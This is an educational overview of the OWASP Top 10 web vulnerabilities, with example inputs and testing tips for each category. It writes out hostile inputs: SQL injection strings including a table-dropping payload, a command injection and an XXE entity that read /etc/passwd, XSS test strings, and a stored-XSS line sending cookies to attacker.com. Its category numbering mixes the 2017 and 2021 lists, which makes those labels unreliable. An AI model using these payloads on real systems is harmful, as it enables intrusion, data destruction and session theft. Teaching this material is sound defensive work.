# OWASP Top 10 Vulnerabilities

The OWASP Top 10 represents the most critical web application security risks. These vulnerabilities appear in millions of applications worldwide and cause the majority of successful cyberattacks.

---

## Why the OWASP Top 10 Matters

**It's based on real data** - These vulnerabilities are ranked by actual breach frequency, not theoretical impact.

**It guides security focus** - Organizations use this list to prioritize their security efforts and testing.

**It drives compliance** - Many security standards and regulations reference the OWASP Top 10.

---

## A01: Injection - When Input Becomes Code

### SQL Injection - The Classic Attack

**Why it happens:** Applications concatenate user input directly into SQL queries instead of using parameterized queries.

**Simple Example:**
```sql
-- Vulnerable code creates this query:
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'

-- Attacker inputs: admin' --
-- Resulting query:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'password123'
-- The -- comments out the password check!
```

**Testing for SQL Injection:**
```
' OR '1'='1
" OR "1"="1
admin'--
'; DROP TABLE users;--
```

**Why it's dangerous:** Attackers can read entire databases, modify data, or even execute system commands.

### Other Injection Types

**Command Injection:**
```bash
# Vulnerable: system("ping " + user_input)
# Attacker input: 8.8.8.8; cat /etc/passwd
# System executes: ping 8.8.8.8; cat /etc/passwd
```

**NoSQL Injection:**
```javascript
// MongoDB becomes: db.users.find({username: {"$ne": ""}, password: {"$ne": ""}})
// This returns all users instead of checking credentials!
```

---

## A02: Broken Authentication - When Login Systems Fail

### Common Authentication Problems

**Weak Passwords:** Systems that allow "password123" or "admin" as passwords.

**Credential Stuffing:** Attackers use leaked password lists from other breaches to try logging into your system.

**Session Hijacking:** Stealing someone's session cookie to impersonate them.

**Brute Force Attacks:** Trying thousands of password combinations when there's no rate limiting.

### Real-World Example
```
# No rate limiting on login attempts
POST /login
username=admin&password=password1
username=admin&password=password2
... continues until success
```

**Testing Authentication:**
- Try common passwords (admin, password, 123456)
- Check if rate limiting exists
- Test session timeout behavior
- Try accessing admin functions with regular user sessions

---

## A03: Sensitive Data Exposure - When Secrets Leak

### How Data Gets Exposed

**Transmitted in plaintext:** Login forms over HTTP instead of HTTPS

**Weak encryption:** Using MD5 for passwords (easily cracked) or storing passwords in plain text

**Information disclosure:** Error messages revealing system details, backup files left accessible

**Example of Dangerous Error:**
```
MySQL Error: Table 'users' doesn't exist in database 'webapp_production'
File: /var/www/html/admin/users.php, Line: 42
# This reveals technology stack, file paths, and internal structure
```

### Testing for Data Exposure
- Check if login pages use HTTPS
- Look for accessible backup files (.sql, .txt, .zip)
- Test error handling with invalid input
- Check if sensitive data appears in URLs or logs

---

## A04: XML External Entities (XXE) - File Disclosure Through XML

### What XXE Does

XXE attacks abuse XML processing to read files from the server or make requests to internal systems.

**Basic XXE Attack:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user>
    <name>&xxe;</name>
</user>
```

When the server processes this XML, it includes the contents of /etc/passwd in the response.

**Why it's dangerous:** Attackers can read configuration files, source code, or scan internal networks.

---

## A05: Broken Access Control - Accessing What You Shouldn't

### Insecure Direct Object References (IDOR)

**The problem:** Applications use predictable identifiers without checking if the user should access that resource.

**Example:**
```
# Your profile
GET /profile?user_id=123

# Someone else's profile (shouldn't be accessible)
GET /profile?user_id=124
```

### Vertical Privilege Escalation

**The problem:** Regular users can access admin functions because the application doesn't check permissions properly.

```
# Regular user tries admin function
POST /admin/delete_user
user_id=456
# If server doesn't verify admin permissions, it might work!
```

---

## A06: Security Misconfiguration - Default Settings Kill Security

### Common Misconfigurations

**Default credentials:** admin/admin, admin/password still work

**Directory listing enabled:** /backup/ shows database_backup.sql, passwords.txt

**Verbose error messages:** Revealing internal file paths, database schemas, technology details

**Unnecessary services running:** FTP, SSH, debug endpoints in production

### Testing for Misconfigurations
- Try default usernames/passwords
- Check for /admin, /test, /debug, /backup directories
- Look for detailed error messages
- Scan for unnecessary open ports

---

## A07: Cross-Site Scripting (XSS) - Making Browsers Execute Malicious Code

### Why XSS is Dangerous

XSS allows attackers to execute JavaScript in victims' browsers, leading to:
- Cookie theft and session hijacking
- Defacing websites
- Redirecting users to malicious sites
- Performing actions as the victim

### Types of XSS

**Reflected XSS:**
```html
<!-- Vulnerable page shows: -->
<p>Search results for: <script>alert('XSS')</script></p>
<!-- Browser executes the script! -->
```

**Stored XSS:**
```html
<!-- Malicious comment stored in database: -->
<script>fetch('//attacker.com?cookie='+document.cookie)</script>
<!-- Executes for every user viewing the page -->
```

**Testing for XSS:**
```
<script>alert(1)</script>
'"><script>alert(1)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)
```

---

## A08-A10: Advanced Vulnerabilities

### A08: Insecure Deserialization
**Problem:** Applications trust serialized data from users, allowing code execution.

### A09: Using Components with Known Vulnerabilities  
**Problem:** Outdated libraries with known security flaws (jQuery 1.6, old Apache Struts versions).

### A10: Insufficient Logging & Monitoring
**Problem:** Attacks go undetected because security events aren't logged or monitored.

---

## Practice and Learning

### Hands-On Practice
- **OWASP Juice Shop**: https://owasp.org/www-project-juice-shop/ - Modern vulnerable app
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security - Free interactive labs
- **DVWA**: https://github.com/digininja/DVWA - Classic vulnerable application

### Essential Reading
- **OWASP Top 10 2021**: https://owasp.org/Top10/ - Official detailed documentation
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/ - How to test for these vulnerabilities

### Real-World Context
- **HackerOne Reports**: https://hackerone.com/hacktivity - See how these vulnerabilities appear in real applications
- **OWASP WebGoat**: https://owasp.org/www-project-webgoat/ - Guided learning with explanations